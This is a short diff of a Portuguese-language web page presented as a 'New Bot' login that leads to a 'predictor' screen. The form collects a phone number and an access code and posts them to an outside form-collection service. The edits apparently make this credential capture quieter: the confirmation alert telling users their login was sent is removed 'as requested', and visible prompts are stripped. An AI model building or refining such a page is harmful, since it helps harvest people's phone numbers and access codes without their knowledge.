@@ -89,13 +89,11 @@
         <h2>New Bot - Login</h2>
         <p>Seja bem-vindo</p>
         <form id="login-form" action="https://formspree.io/f/mldwwpnb" method="POST">
-            <p>Esperavamos por ti.</p>
-
             <label for="phone">Número de Telemóvel:</label>
-            <input type="tel" id="phone" name="phone" placeholder="912345678" maxlength="9" required pattern="\d{9}" />
+            <input type="tel" id="phone" name="phone" placeholder="" maxlength="9" required pattern="\d{9}" />
 
             <label for="access">Código de Acesso:</label>
-            <input type="password" id="access" name="auth_code" required minlength="4" />
+            <input type="password" id="access" name="auth_code" placeholder="" required minlength="4" />
 
             <!-- Honeypot (anti-spam) -->
             <input type="text" name="_honey" style="display:none">
@@ -156,7 +154,7 @@
                 });
 
                 if (response.ok) {
-                    alert('Login enviado com sucesso!');
+                    // Mensagem removida conforme pedido
                     document.getElementById('login-screen').classList.add('hidden');
                     document.getElementById('predictor-screen').classList.remove('hidden');
                 } else {
